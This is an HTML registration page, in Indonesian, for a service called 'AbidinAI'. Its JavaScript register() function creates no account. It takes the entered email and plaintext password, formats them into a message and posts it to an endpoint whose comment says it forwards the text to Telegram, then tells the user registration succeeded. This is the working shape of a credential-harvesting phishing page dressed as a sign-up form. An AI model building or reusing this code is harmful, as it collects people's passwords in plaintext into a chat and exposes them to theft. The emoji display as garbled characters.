<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Registrasi AbidinAI</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #1f4037, #99f2c8);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      color: white;
    }

    .container {
      background: rgba(0, 0, 0, 0.3);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0,0,0,0.4);
      width: 300px;
      text-align: center;
    }

    input {
      width: 93%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
    }

    button {
      padding: 10px 20px;
      background-color: #34e89e;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      width: 100%;
      margin-top: 10px;
    }

    a {
      color: #34e89e;
      text-decoration: none;
      display: block;
      margin-top: 10px;
    }

    .password-wrapper {
      position: relative;
    }

    .password-wrapper span {
      position: absolute;
      top: 15px;
      right: 10px;
      cursor: pointer;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Registrasi AbidinAI</h2>
    <input type="text" id="username" placeholder="Masukkan Email">

    <div class="password-wrapper">
      <input type="password" id="password" placeholder="Masukkan Password">
      <span id="togglePassword" onclick="togglePassword()">ðŸ”’</span>
    </div>

    <button onclick="register()">Daftar</button>
    <a href="login.html">Sudah punya akun? Login</a>
  </div>

  <script>
    function register() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      if (!username || !password) {
        alert("âš ï¸ Isi semua kolom!");
        return;
      }

      const message = `ðŸ“ Registrasi:\nðŸ‘¤ Username: ${username}\nðŸ”‘ Password: ${password}`;

      // Kirim ke backend, backend teruskan ke Telegram
      fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ text: message })
      })
      .then(() => {
        alert("Berhasil daftar! Silakan login.");
        window.location.href = "login.html";
      })
      .catch((error) => {
        console.error("Gagal kirim ke Telegram via backend:", error);
        alert("Gagal daftar. Coba lagi.");
      });
    }

    function togglePassword() {
      const passInput = document.getElementById("password");
      const toggleBtn = document.getElementById("togglePassword");

      if (passInput.type === "password") {
        passInput.type = "text";
        toggleBtn.textContent = "ðŸ”“";
      } else {
        passInput.type = "password";
        toggleBtn.textContent = "ðŸ”’";
      }
    }
  </script>
</body>
</html>
